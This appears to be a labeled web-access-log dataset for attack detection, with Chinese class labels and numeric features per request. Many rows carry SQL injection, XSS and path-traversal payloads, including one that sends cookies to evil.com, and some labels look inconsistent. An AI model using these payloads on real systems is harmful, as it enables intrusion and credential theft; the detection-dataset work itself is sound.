+172.16.0.3,20/May/2025:15:42:18 +0800,GET,/api/v2/data?limit=20&offset=0,304,2165,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+45.33.32.100,20/May/2025:17:37:24 +0800,GET,/js/main.js,304,26490,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+8.8.8.8,20/May/2025:12:22:32 +0800,GET,/profile/settings,301,15243,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+192.168.1.12,20/May/2025:05:23:10 +0800,GET,/..%2F..%2F..%2Fetc%2Fpasswd,200,1188,curl/8.4.0,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
+192.168.1.12,20/May/2025:13:02:40 +0800,GET,/page?q=<svg onload=alert('XSS')>,200,4892,curl/8.4.0,33,0.30303030303030304,1,1,0,1,0.3189416824714734,1,XSS攻击
+192.168.1.11,20/May/2025:17:50:02 +0800,GET,/list?category=1 UNION ALL SELECT table_name FROM information_schema.tables--,500,3988,python-requests/2.31.0,77,0.06493506493506493,1,0,0,1,0.963961862375453,1,SQL注入
+203.0.113.10,20/May/2025:00:28:56 +0800,GET,/api/products?page=1,200,8849,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+66.249.66.1,20/May/2025:12:37:29 +0800,GET,/api/products?page=1,200,34992,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+172.16.0.7,20/May/2025:21:26:15 +0800,GET,/sitemap.xml,200,10028,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+10.0.0.12,20/May/2025:03:12:31 +0800,GET,/api/notifications?unread=true,200,1098,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+10.0.0.12,20/May/2025:05:58:45 +0800,GET,/news.php?id=1' AND 1=1--,400,1561,python-requests/2.31.0,25,0.28,1,0,0,1,0.3656998525130988,1,SQL注入
+172.16.0.3,20/May/2025:12:47:33 +0800,GET,/api/v2/data?limit=20&offset=0,301,24360,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+192.168.1.10,20/May/2025:01:11:43 +0800,GET,/..%2F..%2F..%2Fetc%2Fpasswd,400,2723,python-requests/2.31.0,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
+1.1.1.1,20/May/2025:17:52:44 +0800,GET,/sitemap.xml,200,13714,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+10.0.0.12,20/May/2025:19:14:47 +0800,GET,/blog/post-2.html,301,35306,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+192.168.1.11,20/May/2025:21:57:43 +0800,GET,/download?file=1' UNION SELECT password FROM admin--,404,834,Mozilla/5.0 (compatible; Nmap Scripting Engine),52,0.11538461538461539,1,0,0,1,0.3955366455843667,1,SQL注入
+172.16.0.15,20/May/2025:18:48:15 +0800,GET,/static/fonts/arial.woff,200,48655,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+192.168.1.12,20/May/2025:16:31:56 +0800,GET,/..%2f..%2f..%2fetc/passwd,403,2552,python-requests/2.31.0,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
+10.0.0.20,20/May/2025:03:14:01 +0800,GET,/include?page=..%c0%af..%c0%af..%c0%afetc/passwd,403,1736,curl/8.4.0,36,0.1111111111111111,0,0,0,1,0.3720467579562914,0,正常
+198.51.100.7,20/May/2025:05:19:49 +0800,GET,/blog/post-2.html,304,28587,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+192.168.1.15,20/May/2025:05:03:42 +0800,GET,"/product?id=2' UNION SELECT NULL,NULL,NULL--",400,3711,sqlmap/1.7,44,0.13636363636363635,1,0,0,1,0.3473683343907862,1,SQL注入
+223.5.5.5,20/May/2025:23:48:28 +0800,GET,/images/logo.png,200,49074,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+10.0.0.8,20/May/2025:15:51:06 +0800,GET,/profile/settings,304,31556,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+66.249.66.1,20/May/2025:14:35:22 +0800,GET,/api/notifications?unread=true,200,25760,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+66.249.66.1,20/May/2025:08:29:14 +0800,GET,/blog/post-1.html,304,24816,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+192.168.1.15,20/May/2025:14:30:04 +0800,GET,/download?file=../../../etc/passwd,200,1293,sqlmap/1.7,34,0.20588235294117646,0,0,0,1,0.2130243670859868,1,路径遍历
+66.249.66.1,20/May/2025:18:35:22 +0800,GET,/css/bootstrap.min.css,200,14164,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,22,0.09090909090909091,0,0,1,0,0.37134367342794,0,正常
+10.0.0.8,20/May/2025:00:42:02 +0800,GET,/blog/post-2.html,200,4523,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+192.168.1.11,20/May/2025:01:02:12 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,400,3670,Hydra/9.4,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
+172.16.0.3,20/May/2025:18:22:40 +0800,GET,/downloads/manual.pdf,200,47728,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+192.168.1.10,20/May/2025:20:59:02 +0800,GET,/static/fonts/arial.woff,200,20510,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+66.249.66.1,20/May/2025:13:43:43 +0800,GET,/images/banner.jpg,200,17114,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+192.168.1.12,20/May/2025:00:58:24 +0800,GET,/images/../../../etc/hosts,400,1613,Mozilla/5.0 (compatible; Nmap Scripting Engine),26,0.23076923076923078,0,0,5,0,1.0,1,路径遍历
+192.168.1.15,20/May/2025:15:51:56 +0800,GET,/redirect?url=javascript:alert(document.domain),403,2115,sqlmap/1.7,47,0.10638297872340426,0,1,0,1,0.42715866125403645,1,XSS攻击
+203.0.113.10,20/May/2025:06:25:25 +0800,GET,/contact.html,304,28569,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,13,0.07692307692307693,0,0,0,0,0.3762649369429833,0,正常
+223.5.5.5,20/May/2025:05:41:10 +0800,GET,/js/main.js,200,37944,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+45.33.32.100,20/May/2025:11:24:34 +0800,GET,/sitemap.xml,200,14498,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+192.168.1.10,20/May/2025:18:40:51 +0800,GET,/js/main.js,304,49771,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+114.114.114.114,20/May/2025:07:36:32 +0800,GET,/api/search?q=phone,200,1662,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,19,0.21052631578947367,0,0,1,1,0.2513199505315775,0,正常
+114.114.114.114,20/May/2025:13:24:45 +0800,GET,/dashboard,200,48381,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+172.16.0.3,20/May/2025:06:00:08 +0800,GET,/contact.html,200,14038,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,13,0.07692307692307693,0,0,0,0,0.3762649369429833,0,正常
+203.0.113.10,20/May/2025:01:17:27 +0800,GET,/api/user?id=3,200,12272,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+192.168.1.12,20/May/2025:06:07:47 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,500,4537,sqlmap/1.7,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
+192.168.1.10,20/May/2025:20:09:56 +0800,GET,/blog/post-1.html,200,10495,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+172.16.0.15,20/May/2025:20:56:25 +0800,GET,/dashboard,200,23459,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+203.0.113.5,20/May/2025:05:41:13 +0800,GET,/register.html,200,48377,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
+10.0.0.20,20/May/2025:14:06:41 +0800,GET,/css/bootstrap.min.css,200,5732,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,22,0.09090909090909091,0,0,1,0,0.37134367342794,0,正常
+8.8.8.8,20/May/2025:13:47:00 +0800,GET,/login.html,200,16161,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.8,20/May/2025:09:08:11 +0800,GET,/forum?post=<script>fetch('http://evil.com?c='+document.cookie)</script>,200,2658,sqlmap/1.7,72,0.2361111111111111,1,1,0,1,0.6075385415259974,1,XSS攻击
+203.0.113.5,20/May/2025:03:28:24 +0800,GET,/category/electronics,301,18991,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+114.114.114.114,20/May/2025:22:14:50 +0800,GET,/api/orders?status=active,304,38537,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,25,0.16,0,0,1,1,0.3559522842791986,0,正常
+192.168.1.10,20/May/2025:06:04:30 +0800,GET,/sitemap.xml,304,21912,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+192.168.1.12,20/May/2025:04:54:42 +0800,GET,/../../../etc/passwd,500,712,python-requests/2.31.0,20,0.25,0,0,4,0,0.7004716638371997,1,路径遍历
+10.0.0.5,20/May/2025:01:57:52 +0800,GET,"/query?q=1' UNION SELECT concat(user,0x3a,password) FROM users--",403,3315,Wget/1.21.3,64,0.125,1,0,0,1,0.47108952359647344,1,SQL注入
+203.0.113.5,20/May/2025:15:10:41 +0800,GET,/blog/post-1.html,200,22802,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+10.0.0.5,20/May/2025:15:45:24 +0800,GET,/read?path=....//....//....//etc/passwd,200,715,sqlmap/1.7,39,0.2564102564102564,0,0,0,1,0.2299033851549451,1,路径遍历
+198.51.100.7,20/May/2025:23:58:45 +0800,GET,/api/orders?status=active,200,39926,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,25,0.16,0,0,1,1,0.3559522842791986,0,正常
+192.168.1.11,20/May/2025:16:02:22 +0800,GET,/news.php?id=1' AND 1=1--,500,824,Mozilla/5.0 (compatible; Nmap Scripting Engine),25,0.28,1,0,0,1,0.3656998525130988,1,SQL注入
+10.0.0.8,20/May/2025:10:06:35 +0800,GET,/search?id=1 OR 1=1,200,1239,sqlmap/1.7,19,0.21052631578947367,1,0,0,1,0.42170703205838495,1,SQL注入
+203.0.113.10,20/May/2025:21:30:26 +0800,GET,/api/v2/data?limit=20&offset=0,200,21367,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+192.168.1.11,20/May/2025:21:49:06 +0800,GET,/api/products?page=1,200,10936,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+8.8.8.8,20/May/2025:04:12:26 +0800,GET,/js/app.js,200,20491,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+172.16.0.3,20/May/2025:02:51:16 +0800,GET,/register.html,200,14806,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
+192.168.1.11,20/May/2025:12:10:30 +0800,GET,/download?file=1' UNION SELECT password FROM admin--,400,829,python-requests/2.31.0,52,0.11538461538461539,1,0,0,1,0.3955366455843667,1,SQL注入
+203.0.113.5,20/May/2025:03:24:19 +0800,GET,/static/fonts/arial.woff,200,41454,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+10.0.0.20,20/May/2025:19:02:15 +0800,GET,/blog/post-2.html,200,29045,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+10.0.0.20,20/May/2025:09:30:21 +0800,GET,/js/app.js,200,42328,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+172.16.0.3,20/May/2025:05:54:37 +0800,GET,/downloads/manual.pdf,200,3845,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+192.168.1.12,20/May/2025:09:40:29 +0800,GET,/profile/settings,200,25969,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+192.168.1.10,20/May/2025:21:36:41 +0800,GET,/downloads/manual.pdf,200,47544,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+192.168.1.11,20/May/2025:03:04:29 +0800,GET,/news.php?id=1' AND 1=1--,400,3600,python-requests/2.31.0,25,0.28,1,0,0,1,0.3656998525130988,1,SQL注入
+10.0.0.5,20/May/2025:05:55:24 +0800,GET,/about.html,200,43447,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+45.33.32.100,20/May/2025:01:08:52 +0800,GET,/robots.txt,200,42261,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+198.51.100.7,20/May/2025:06:14:26 +0800,GET,/api/v2/data?limit=20&offset=0,304,48350,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+1.1.1.1,20/May/2025:07:48:50 +0800,GET,/api/products?page=1,304,49551,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+203.0.113.10,20/May/2025:10:41:34 +0800,GET,/sitemap.xml,200,1933,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+10.0.0.12,20/May/2025:15:32:36 +0800,GET,/dashboard,200,9947,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+172.16.0.7,20/May/2025:11:20:21 +0800,GET,/category/electronics,304,22197,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+192.168.1.12,20/May/2025:06:54:02 +0800,GET,/download?file=../../../etc/passwd,500,880,Hydra/9.4,34,0.20588235294117646,0,0,0,1,0.2130243670859868,1,路径遍历
+172.16.0.7,20/May/2025:09:39:27 +0800,GET,/profile/settings,200,2632,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+10.0.0.12,20/May/2025:23:22:31 +0800,GET,/downloads/manual.pdf,304,15089,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+10.0.0.8,20/May/2025:22:38:50 +0800,GET,/images/logo.png,200,21546,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+1.1.1.1,20/May/2025:15:57:58 +0800,GET,/downloads/manual.pdf,200,38318,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+1.1.1.1,20/May/2025:02:02:40 +0800,GET,/sitemap.xml,304,5755,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+192.168.1.15,20/May/2025:14:39:53 +0800,GET,/images/logo.png,200,41015,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+192.168.1.11,20/May/2025:20:18:06 +0800,GET,"/query?q=1' UNION SELECT concat(user,0x3a,password) FROM users--",404,4381,sqlmap/1.7,64,0.125,1,0,0,1,0.47108952359647344,1,SQL注入
+10.0.0.12,20/May/2025:22:47:31 +0800,GET,/login?user=admin'--&pass=anything,200,2283,python-requests/2.31.0,34,0.23529411764705882,1,0,0,2,0.8054098751394609,1,SQL注入
+203.0.113.10,20/May/2025:04:23:26 +0800,GET,/robots.txt,200,43167,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.12,20/May/2025:20:02:17 +0800,GET,/review?text=<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,404,4355,Wget/1.21.3,59,0.23728813559322035,1,1,0,1,0.4725875135982099,1,XSS攻击
+192.168.1.12,20/May/2025:18:41:22 +0800,GET,/terms.html,200,34100,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.12,20/May/2025:05:06:06 +0800,GET,/search?id=1 OR 1=1,200,2863,python-requests/2.31.0,19,0.21052631578947367,1,0,0,1,0.42170703205838495,1,SQL注入
+10.0.0.20,20/May/2025:23:00:08 +0800,GET,/static/fonts/arial.woff,200,38593,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+192.168.1.10,20/May/2025:07:52:09 +0800,GET,/comment?msg=<img src=x onerror=alert(1)>,403,2330,Wget/1.21.3,41,0.21951219512195122,0,1,0,1,0.26239957001406006,1,XSS攻击
+192.168.1.15,20/May/2025:13:44:29 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,400,2281,Hydra/9.4,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
+10.0.0.5,20/May/2025:12:49:21 +0800,GET,/news.php?id=1' AND 1=1--,400,4587,Hydra/9.4,25,0.28,1,0,0,1,0.3656998525130988,1,SQL注入
+192.168.1.11,20/May/2025:01:42:38 +0800,GET,/api/user?id=3,200,12518,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+172.16.0.15,20/May/2025:05:56:47 +0800,GET,/api/products?page=1,301,31699,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+192.168.1.15,20/May/2025:22:08:09 +0800,GET,"/product?id=2' UNION SELECT NULL,NULL,NULL--",400,1345,python-requests/2.31.0,44,0.13636363636363635,1,0,0,1,0.3473683343907862,1,SQL注入
+203.0.113.10,20/May/2025:08:48:09 +0800,GET,/images/logo.png,301,23080,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+223.5.5.5,20/May/2025:06:02:46 +0800,GET,/images/banner.jpg,301,41178,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+10.0.0.12,20/May/2025:13:04:33 +0800,GET,"/product?id=2' UNION SELECT NULL,NULL,NULL--",404,1530,python-requests/2.31.0,44,0.13636363636363635,1,0,0,1,0.3473683343907862,1,SQL注入
+45.33.32.100,20/May/2025:20:23:47 +0800,GET,/images/banner.jpg,200,39357,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+172.16.0.3,20/May/2025:15:36:40 +0800,GET,/register.html,304,37370,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
+10.0.0.20,20/May/2025:00:47:39 +0800,GET,/search?q=<body onload=alert(1)>,404,3646,python-requests/2.31.0,32,0.25,0,1,0,1,0.25939519289033136,1,XSS攻击
+192.168.1.10,20/May/2025:13:24:36 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,403,182,sqlmap/1.7,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
+192.168.1.10,20/May/2025:01:36:24 +0800,GET,/review?text=<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,400,2576,curl/8.4.0,59,0.23728813559322035,1,1,0,1,0.4725875135982099,1,XSS攻击
+10.0.0.20,20/May/2025:23:43:11 +0800,GET,/api/products?page=1,200,23578,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+10.0.0.5,20/May/2025:07:48:21 +0800,GET,/list?category=1 UNION ALL SELECT table_name FROM information_schema.tables--,403,4668,curl/8.4.0,77,0.06493506493506493,1,0,0,1,0.963961862375453,1,SQL注入
+192.168.1.11,20/May/2025:11:23:22 +0800,GET,/api/data?id=1' OR 'a'='a,500,1120,python-requests/2.31.0,25,0.36,1,0,1,1,0.6657606811381037,1,SQL注入
+66.249.66.1,20/May/2025:22:34:23 +0800,GET,/robots.txt,200,22025,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+1.1.1.1,20/May/2025:16:43:15 +0800,GET,/downloads/manual.pdf,200,43853,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+192.168.1.12,20/May/2025:22:35:12 +0800,GET,/../../../etc/passwd,404,1411,Mozilla/5.0 (compatible; Nmap Scripting Engine),20,0.25,0,0,4,0,0.7004716638371997,1,路径遍历
+192.168.1.11,20/May/2025:21:59:34 +0800,GET,/redirect?url=javascript:alert(document.domain),500,4123,python-requests/2.31.0,47,0.10638297872340426,0,1,0,1,0.42715866125403645,1,XSS攻击
+203.0.113.10,20/May/2025:01:59:22 +0800,GET,/api/notifications?unread=true,304,12818,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+172.16.0.15,20/May/2025:22:45:46 +0800,GET,/js/main.js,200,40225,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+223.5.5.5,20/May/2025:22:06:28 +0800,GET,/terms.html,200,19294,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+172.16.0.15,20/May/2025:20:40:12 +0800,GET,/login.html,200,42312,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.5,20/May/2025:07:29:19 +0800,GET,/robots.txt,200,5560,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.12,20/May/2025:14:27:14 +0800,GET,/css/bootstrap.min.css,200,49540,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,22,0.09090909090909091,0,0,1,0,0.37134367342794,0,正常
+192.168.1.10,20/May/2025:15:35:24 +0800,GET,/api/notifications?unread=true,200,45603,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+203.0.113.10,20/May/2025:18:54:27 +0800,GET,/api/products?page=1,200,16299,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,20,0.2,0,0,1,1,0.17589686625199608,0,正常
